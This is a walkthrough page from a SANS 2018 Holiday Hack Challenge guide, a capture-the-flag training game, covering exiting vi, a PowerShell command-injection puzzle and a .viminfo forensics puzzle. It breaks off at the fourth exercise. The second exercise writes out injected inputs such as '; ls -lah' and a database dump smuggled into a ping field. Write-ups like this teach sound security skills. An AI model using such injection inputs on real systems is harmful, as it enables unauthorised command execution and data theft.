



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.2.0">
    
    
      
        <title>Terminal Exercises - SANS 2018 Holiday Hack Challenge Guide</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.572ca0f0.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.8c900955.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#1-essential-editor-skills-bushy-evergreen" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="SANS 2018 Holiday Hack Challenge Guide" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                SANS 2018 Holiday Hack Challenge Guide
              </span>
              <span class="md-header-nav__topic">
                Terminal Exercises
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="SANS 2018 Holiday Hack Challenge Guide" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    SANS 2018 Holiday Hack Challenge Guide
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../main/" title="Main Objectives" class="md-nav__link">
      Main Objectives
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Terminal Exercises
      </label>
    
    <a href="./" title="Terminal Exercises" class="md-nav__link md-nav__link--active">
      Terminal Exercises
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#1-essential-editor-skills-bushy-evergreen" title="1) Essential Editor Skills (Bushy Evergreen)" class="md-nav__link">
    1) Essential Editor Skills (Bushy Evergreen)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-the-name-game-minty-candycane" title="2) The Name Game (Minty Candycane)" class="md-nav__link">
    2) The Name Game (Minty Candycane)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-lethal-forensicelfication-tangle-coalbox" title="3) Lethal ForensicELFication (Tangle Coalbox)" class="md-nav__link">
    3) Lethal ForensicELFication (Tangle Coalbox)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-stall-mucking-report-wunorse-openslae" title="4) Stall Mucking Report (Wunorse Openslae)" class="md-nav__link">
    4) Stall Mucking Report (Wunorse Openslae)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-curling-master-holly-evergreen" title="5) CURLing Master (Holly Evergreen)" class="md-nav__link">
    5) CURLing Master (Holly Evergreen)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-yule-log-analysis-pepper-minstix" title="6) Yule Log Analysis (Pepper Minstix)" class="md-nav__link">
    6) Yule Log Analysis (Pepper Minstix)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-dev-ops-fail-sparkle-redberry" title="7) Dev Ops Fail (Sparkle Redberry)" class="md-nav__link">
    7) Dev Ops Fail (Sparkle Redberry)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-python-escape-from-la-sugarplum-mary" title="8) Python Escape from LA (SugarPlum Mary)" class="md-nav__link">
    8) Python Escape from LA (SugarPlum Mary)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-sleigh-bell-lottery-shinny-upatree" title="9) Sleigh Bell Lottery (Shinny Upatree)" class="md-nav__link">
    9) Sleigh Bell Lottery (Shinny Upatree)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#changing-the-drawings-value" title="Changing the Drawing's Value" class="md-nav__link">
    Changing the Drawing's Value
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumping-to-the-winnerwinner-function" title="Jumping to the 'winnerwinner' function." class="md-nav__link">
    Jumping to the 'winnerwinner' function.
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../appendices/" title="Appendices" class="md-nav__link">
      Appendices
    </a>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#1-essential-editor-skills-bushy-evergreen" title="1) Essential Editor Skills (Bushy Evergreen)" class="md-nav__link">
    1) Essential Editor Skills (Bushy Evergreen)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-the-name-game-minty-candycane" title="2) The Name Game (Minty Candycane)" class="md-nav__link">
    2) The Name Game (Minty Candycane)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-lethal-forensicelfication-tangle-coalbox" title="3) Lethal ForensicELFication (Tangle Coalbox)" class="md-nav__link">
    3) Lethal ForensicELFication (Tangle Coalbox)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-stall-mucking-report-wunorse-openslae" title="4) Stall Mucking Report (Wunorse Openslae)" class="md-nav__link">
    4) Stall Mucking Report (Wunorse Openslae)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-curling-master-holly-evergreen" title="5) CURLing Master (Holly Evergreen)" class="md-nav__link">
    5) CURLing Master (Holly Evergreen)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-yule-log-analysis-pepper-minstix" title="6) Yule Log Analysis (Pepper Minstix)" class="md-nav__link">
    6) Yule Log Analysis (Pepper Minstix)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-dev-ops-fail-sparkle-redberry" title="7) Dev Ops Fail (Sparkle Redberry)" class="md-nav__link">
    7) Dev Ops Fail (Sparkle Redberry)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-python-escape-from-la-sugarplum-mary" title="8) Python Escape from LA (SugarPlum Mary)" class="md-nav__link">
    8) Python Escape from LA (SugarPlum Mary)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-sleigh-bell-lottery-shinny-upatree" title="9) Sleigh Bell Lottery (Shinny Upatree)" class="md-nav__link">
    9) Sleigh Bell Lottery (Shinny Upatree)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#changing-the-drawings-value" title="Changing the Drawing's Value" class="md-nav__link">
    Changing the Drawing's Value
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumping-to-the-winnerwinner-function" title="Jumping to the 'winnerwinner' function." class="md-nav__link">
    Jumping to the 'winnerwinner' function.
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Terminal Exercises</h1>
                
                <h3 id="1-essential-editor-skills-bushy-evergreen">1) Essential Editor Skills (Bushy Evergreen)<a class="headerlink" href="#1-essential-editor-skills-bushy-evergreen" title="Permanent link">&para;</a></h3>
<p>You can find this terminal in the first floor lobby, just to the right of the entrance.</p>
<p><img alt="Location" src="1-location.png" /></p>
<blockquote>
<p>Hi, I'm Bushy Evergreen.
I'm glad you're here, I'm the target of a terrible trick.
Pepper says his editor is the best, but I don't understand why.
He's forcing me to learn vi.
He gave me a link, I'm supposed to learn the basics.
Can you assist me with one of the simple cases?</p>
</blockquote>
<pre><code>             ........................................
           .;oooooooooooool;,,,,,,,,:loooooooooooooll:
         .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
       .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
     .''''''''''''''''''''''''''''''''''''''''';ooooo:
   ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
.:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
.cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
:llllllllllllll,'''''''';llllllllllllllc,



I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though &quot;best&quot; she says - she yells!
My lesson one and your role is exit back to shellz.

-Bushy Evergreen

Exit vi.
</code></pre>

<p>We see that someone has cruelly trapped Bushy in the vi editor. Although relatively unintuitive, the escape method is quite simple. Typing a colon (<code>:</code>) to write an editor command, typing <code>q</code> to ready the 'quit editor' command, and pressing enter to issue the command.</p>
<pre><code>Loading, please wait......

You did it! Congratulations!

elf@16e18889037b:~$
</code></pre>

<blockquote>
<p>Wow, it seems so easy now that you've shown me how!
To thank you, I'd like to share some other tips with you.
Have you taken a look at the Orientation Challenge?
This challenge is limited to past SANS Holiday Hack Challenges from 2015, 2016, and 2017. You DO NOT need to play those challenges.
If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need...
It may take a little poking around, but with your skills, I'm sure it'll be a wintergreen breeze!</p>
<p>- Bushy Evergreen</p>
</blockquote>
<h3 id="2-the-name-game-minty-candycane">2) The Name Game (Minty Candycane)<a class="headerlink" href="#2-the-name-game-minty-candycane" title="Permanent link">&para;</a></h3>
<p>This terminal is located just to the left of the first floor entranceway.</p>
<p><img alt="Location" src="2-location.png" /></p>
<blockquote>
<p>Hi, I'm Minty Candycane.
Can you help me? I'm in a bit of a fix.
I need to make a nametag for an employee, but I can't remember his first name.
Maybe you can figure it out using this Cranberry Pi terminal?
The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken.
PowerShell itself can be tricky when handling user input. Special characters such as &amp; and ; can be used to inject commands.
I think that system is one of Alabaster's creations.
He's a little ... obsessed with SQLite database storage.
I don't know much about SQLite, just the .dump command.</p>
</blockquote>
<p>Based on the explaination from Minty, this is most likely a 'command injection' exercise.</p>
<pre><code>We just hired this new worker,
Californian or New Yorker?
Think he's making some new toy bag...
My job is to make his name tag.

Golly gee, I'm glad that you came,
I recall naught but his last name!
Use our system or your own plan,
Find the first name of our guy &quot;Chan!&quot;

-Bushy Evergreen

To solve this challenge, determine the new worker's first name and submit to runtoanswer.


====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================


 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.


Please make a selection: 
</code></pre>

<p>We begin attacking this exercise by examining the first option, starting the onboard process.</p>
<pre><code>Welcome to Santa's Castle!


At Santa's Castle, our employees are our family. We care for each other,
and support everyone in our common goals.

Your first test at Santa's Castle is to complete the new employee onboarding paperwork.
Don't worry, it's an easy test! Just complete the required onboarding information below.


Enter your first name.
: `whoami`
Enter your last name.
: $(hostname)
Enter your street address (line 1 of 2).
: ;
Enter your street address (line 2 of 2).
: '
Enter your city.
: &quot;
Enter your postal code.
:  -- 
Enter your phone number.
: # 
Enter your email address.
: .
Is this correct?


`whoami` $(hostname)
;
'
&quot;,  -- 
# 
.
y/n: y
Save to sqlite DB using command line
./sqlite3: Error: unknown option: -
Use -help for a list of options.
Press Enter to continue...: 
</code></pre>

<p>This output seems promising since we successfully caused an error in this query. However, after a bit of experimentation, there doesn't seem to be an immediate way to receive non-error output.</p>
<p>Next, we look into the second option, verifying the system. Based on the function's output, we find that this simply passes the inputted address into a ping command.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.053 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.044/0.049/0.053/0.003 ms
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<p>Our next step is to check if this function is vulnerable to command injection. In the case of our first input, the full command passed to the system would be: <code>ping -c 3 127.0.0.1</code></p>
<p>However, this malicious input appends other commands after the ping command. The full command for this input would look like: <code>ping -c 3 ; ls -lah</code></p>
<p>After passing this input to the function, we receive a list of all files in the current directory, verifying that this input is injectable. </p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; ls -lah
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
total 5.4M
drwxr-xr-x 1 elf  elf  4.0K Jan  8 23:26 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:17 ..
-rw-r--r-- 1 elf  elf   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root   95 Dec 14 16:13 .bashrc
drwxr-xr-x 3 elf  elf  4.0K Jan  8 23:26 .cache
drwxr-xr-x 3 elf  elf  4.0K Jan  8 23:26 .local
-rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
-rw-rw-rw- 1 root root  24K Dec 14 16:13 onboard.db
-rw-r--r-- 1 elf  elf   655 May 16  2017 .profile
-rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<p>Our next step is to run the <code>runtoanswer</code> executable file that we see in the current directory. Here we discover that the last name of the employee we need to give to Minty is 'Chan'.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; ./runtoanswer
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Loading, please wait......



Enter Mr. Chan's first name: 
Sorry, I don't think that is correct answer.
onboard.db: SQLite 3.x database
Press Enter to continue...:  
</code></pre>

<p>To find out his first name, we dump the <code>onboard.db</code> database that's available in our current directory and pass its output to grep for it to search for 'Chan'. We receive a good match and reveal his first name is <strong><em>Scott</em></strong>.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; sqlite3 onboard.db .dump | grep &quot;Chan&quot;
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
INSERT INTO &quot;onboard&quot; VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<p>Armed with this information, we can execute the <code>runtoanswer</code> program and complete the exercise.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; ./runtoanswer
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Loading, please wait......


Enter Mr. Chan's first name: Scott


    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    


Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<blockquote>
<p>Thank you so much for your help! I've gotten Mr. Chan his name tag. I'd love to repay the favor.
Have you ever visited a website and seen a listing of files - like you're browsing a directory? Sometimes this is enabled on web servers.
This is generally unwanted behavior. You can find sleighloads of examples by searching the web for index.of.
On a website, it's sometimes as simple as removing characters from the end of a URL.
What a silly misconfiguration for leaking information!</p>
<p>- Minty Candycane</p>
</blockquote>
<h3 id="3-lethal-forensicelfication-tangle-coalbox">3) Lethal ForensicELFication (Tangle Coalbox)<a class="headerlink" href="#3-lethal-forensicelfication-tangle-coalbox" title="Permanent link">&para;</a></h3>
<p>This exericse is located on the second floor in the right hallway.</p>
<p><img alt="Location" src="3-location.png" /></p>
<blockquote>
<p>Hi, I'm Tangle Coalbox.
Any chance you can help me with an investigation?
Elf Resources assigned me to look into a case, but it seems to require digital forensic skills.
Do you know anything about Linux terminal editors and digital traces they leave behind?
Apparently editors can leave traces of data behind, but where and how escapes me!</p>
</blockquote>
<pre><code>                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
   .,.   ,. .......,.  .',..'',,..:::::,,;:c:::ccooooodxkkOOkOO0KKXXXNNWMMMMMMM
   ldd: .d' ';... .o:  .d;.;:....'dl,;do,:lloc:codddodOOxxk0KOOKKKKXNNNWMMMMMMM
   lo.ol.d' ';'..  ,d'.lc..;:,,,.'docod:,:l:locldlddokOxdxxOK0OKKKXXXNNWMMMMMMM
   lo  lod' ';      co:o...;:....'dl':dl,:l::oodlcddoxOkxxk0KOOKKKKXNNNWMMMMMMM
   ,,   ,;. ......  .;:....',,,,''c:'':l;;c:;:llccoooodkkOOOkOO0KKKXNNNWMMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM


Christmas is coming, and so it would seem,
ER (Elf Resources) crushes elves' dreams.
One tells me she was disturbed by a bloke.
He tells me this must be some kind of joke.

Please do your best to determine what's real.
Has this jamoke, for this elf, got some feels?
Lethal forensics ain't my cup of tea;
If YOU can fake it, my hero you'll be.

One more quick note that might help you complete,
Clearing this mess up that's now at your feet.
Certain text editors can leave some clue.
Did our young Romeo leave one for you?

- Tangle Coalbox, ER Investigator

  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.
elf@1eebb1670852:~$ ./runtoanswer
Loading, please wait......



Who was the poem written about? blank
Sorry, I don't think that's what the forensic data shows.
</code></pre>

<p>Here we can see that our goal is to determine who is the subject of certain love poem. After navigating through elf's home directory, we find the poem within <code>~/.secrets/her/poem.txt</code></p>
<pre><code>elf@1eebb1670852:~$ cat .secrets/her/poem.txt
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
&quot;'Tis some caroler,&quot; he muttered, &quot;tapping at my sleigh house door--
  Only this and nothing more.&quot;

Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!

Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!

Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?

Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!

\- Morcel Nougat
</code></pre>

<p>At first glance, 'NEVERMORE' seems like the subject of this poem. However, inputting this answer into the <code>runtoanswer</code> program fails.</p>
<p>This line from Tangle gives us a good clue on how to find the answer.</p>
<blockquote>
<p>Apparently editors can leave traces of data behind, but where and how escapes me!</p>
</blockquote>
<p>A file, <code>.viminfo</code>, will contain information on previous uses of vim by this user. Searching through this file provides a significant clue for the subject's identity.</p>
<pre><code>elf@1eebb1670852:~$ cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!
# Viminfo version
|1,4
# Value of 'encoding' when this file was written
*encoding=utf-8
# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&amp;Elinore
# Last Substitute String:
$NEVERMORE
# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,&quot;wq&quot;
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,&quot;%s/Elinore/NEVERMORE/g&quot;
:r .secrets/her/poem.txt
|2,0,1536607201,,&quot;r .secrets/her/poem.txt&quot;
[...snip...]
</code></pre>

<p>From here we can see that the user replaced all instances of 'Elinore' in the poem with 'NEVERMORE', based upon the  command, <code>:%s/Elinore/NEVERMORE/g</code>. Afterwards, they saved the poem into the file we previously read. Based upon this info, we can confirm that <strong><em>Elinore</em></strong> is the subject of this poem.</p>
<pre><code>elf@1eebb1670852:~$ ./runtoanswer
Loading, please wait......
Who was the poem written about? Elinore
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............     
Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.
-Tangle Coalbox
-ER Investigator
Congratulations!
elf@1eebb1670852:~$ 
</code></pre>

<blockquote>
<p>Hey, thanks for the help with the investigation, gumshoe.
Have you been able to solve the lock with the funny shapes?
It reminds me of something called "de Bruijn Sequences."
You can optimize the guesses because there is no start and stop -- each new value is added to the end and the first is removed.
I've even seen de Bruijn sequence generators online.
Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well.
Mathematically this is k=4, n=4 to generate the de Bruijn sequence.
Math is like your notepad and pencil - can't leave home without it!
I heard Alabaster lost his badge! That's pretty bad. What do you think someone could do with that?</p>
<p>- Tangle Coalbox</p>
</blockquote>
<h3 id="4-stall-mucking-report-wunorse-openslae">4) Stall Mucking Report (Wunorse Openslae)<a class="headerlink" href="#4-stall-mucking-report-wunorse-openslae" title="Permanent link">&para;</a></h3>
<p>This terminal can be found in the right hallyway of the first floor.</p>
<p><img alt="Location" src="4-location.png" /></p>
<blockquote>
